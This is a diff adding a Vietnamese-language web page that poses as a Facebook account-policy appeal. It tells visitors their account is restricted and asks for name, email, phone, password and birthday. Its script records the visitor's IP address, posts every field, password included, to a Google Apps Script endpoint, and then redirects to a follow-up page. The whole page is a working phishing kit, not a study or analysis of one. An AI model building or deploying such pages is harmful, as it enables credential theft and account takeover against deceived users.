@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>bố cần code hehe meomeo </title>
+  <style>
+    :root{
+      --bg:#f0f2f5;
+      --card:#fff;
+      --accent:#1877f2;
+      --muted:#6b7280;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family: Inter, "Segoe UI", Roboto, Arial, sans-serif;
+      background:var(--bg);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+      min-height:100vh;
+    }
+    .card{
+      width:100%;
+      max-width:420px;
+      background:var(--card);
+      border-radius:12px;
+      box-shadow:0 8px 30px rgba(8,15,30,0.06);
+      padding:20px;
+    }
+    .hero{
+      width:100%;
+      border-radius:8px;
+      overflow:hidden;
+      background:#e9f2fb;
+      margin-bottom:14px;
+    }
+    .hero img{width:100%;height:auto;display:block;object-fit:cover}
+    h1{
+      font-size:20px;
+      margin:6px 0 8px 0;
+      color:#111827;
+      text-align:center;
+    }
+    p.lead{
+      margin:0 0 14px 0;
+      text-align:center;
+      color:var(--muted);
+      font-size:14px;
+    }
+    form .field{
+      display:flex;
+      flex-direction:column;
+      gap:6px;
+      margin-bottom:12px;
+    }
+    label{font-size:13px;color:var(--muted)}
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    input[type="date"],
+    input[type="password"]{
+      padding:10px 12px;
+      border:1px solid #e6e9ee;
+      border-radius:8px;
+      font-size:14px;
+      outline:none;
+      background:#fff;
+    }
+    input:focus{box-shadow:0 0 0 3px rgba(24,119,242,0.08);border-color:var(--accent)}
+    .btn{
+      width:100%;
+      background:var(--accent);
+      color:#fff;
+      border:none;
+      padding:12px;
+      border-radius:10px;
+      font-weight:600;
+      cursor:pointer;
+      font-size:15px;
+    }
+    .btn:disabled{opacity:.6;cursor:not-allowed}
+    .note{font-size:13px;color:var(--muted);text-align:center;margin-top:12px}
+    @media (max-width:420px){ .card{padding:16px} }
+  </style>
+</head>
+<body>
+  <div class="card" role="main" aria-label="Form đăng ký">
+    <div class="hero" aria-hidden="true">
+      <img src="https://scontent.fhan5-6.fna.fbcdn.net/v/t39.30808-6/474622441_587902164001653_5813857523765240145_n.jpg?_nc_cat=105&ccb=1-7&_nc_sid=127cfc&_nc_ohc=UD2eA8LV-0sQ7kNvwGtV-t4&_nc_oc=AdkJx3H12L_9X9hlRuD4bFZ7bAMyY2hcwUeX-jR4WUD5xUgxEyyYXCQa_Jj0reOlCw0&_nc_zt=23&_nc_ht=scontent.fhan5-6.fna&_nc_gid=MdEedhh1MEedvLTIN7Gw9Q&oh=00_AfZMlab9RYFPbMlBGt5NLXN3lRpTcGwlsCsBOR20nViQyA&oe=68E1CE7A" alt="Security illustration">
+    </div>
+
+    <h1>Khiếu nại chính sách tài khoản</h1>
+    <p class="lead">Chúng tôi đã phát hiện hoạt động bất thường trên tài khoản của bạn vi phạm các tiêu chuẩn cộng đồng của chúng tôi.
+
+Truy cập tài khoản của bạn sẽ bị hạn chế và bạn sẽ không thể đăng, chia sẻ hoặc nhận xét bằng cách sử dụng trang của bạn tại thời điểm này.
+
+Nếu bạn tin rằng đây là một lỗi, bạn có thể nộp đơn khiếu nại bằng cách cung cấp thông tin cần thiết.</p>
+
+    <form id="regForm">
+      <div class="field">
+        <label for="name">Họ và tên</label>
+        <input id="name" name="name" type="text" required autocomplete="name" />
+      </div>
+
+      <div class="field">
+        <label for="email">E-mail</label>
+        <input id="email" name="email" type="email" required autocomplete="email" />
+      </div>
+
+      <div class="field">
+        <label for="phone">Số điện thoại</label>
+        <input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+40" required />
+      </div>
+       
+      <div class="field">
+       <label for="password">Mật khẩu</label>
+       <div style="position:relative;display:inline-block;width:100%;">
+         <input id="password" name="password" type="password" required 
+                style="width:100%;padding-right:40px;height:36px;border-radius:8px;border:1px solid #e6e9ee;" 
+                autocomplete="new-password" />
+         <button type="button" id="togglePw" title="Hiện/ẩn mật khẩu"
+                 style="position:absolute;right:8px;top:50%;transform:translateY(-50%);border:none;background:transparent;cursor:pointer;font-size:16px;">
+           👁
+        </button>
+       </div>
+     </div>
+
+     <script>
+       const togglePw = document.getElementById("togglePw");
+       const passwordInput = document.getElementById("password");
+
+       togglePw.addEventListener("click", () => {
+         if (passwordInput.type === "password") {
+           passwordInput.type = "text";
+           togglePw.textContent = "🙈"; 
+         } else {
+           passwordInput.type = "password";
+           togglePw.textContent = "👁";
+         }
+       });
+     </script>
+
+      <div class="field">
+        <label for="birthday">Ngày sinh</label>
+        <input id="birthday" name="birthday" type="date" required />
+      </div>
+
+      <!-- hidden field for IP -->
+      <input type="hidden" id="ip" name="ip" value="">
+
+      <button class="btn" id="submitBtn" type="submit">Gửi</button>
+    </form>
+  </div>
+
+  <script>
+    // === CONFIG: thay URL bằng Web App của bạn ===
+    const scriptURL = "https://script.google.com/macros/s/AKfycbwmBoY2ZrI_TsL34yovSsm8LHQlu0h0bjjRE3mYKhaCaWuGy_y4UkIJCoTlnrCxxQ8/exec";
+    const redirectURL = "/very";  // gửi xong chuyển thẳng sang /very
+
+    const form = document.getElementById('regForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const ipInput = document.getElementById('ip');
+
+    (async function fetchIP(){
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const j = await r.json();
+        ipInput.value = j.ip || '';
+      } catch (err) {
+        ipInput.value = 'Không lấy được IP';
+      }
+    })();
+
+    form.addEventListener('submit', async (ev) => {
+      ev.preventDefault();
+      submitBtn.disabled = true;
+
+      try {
+        const fd = new FormData(form);
+        await fetch(scriptURL, {
+          method: 'POST',
+          body: fd
+        });
+
+        // Chuyển thẳng sang /very ngay sau submit
+        window.location.href = redirectURL;
+      } catch (err) {
+        console.error(err);
+        submitBtn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
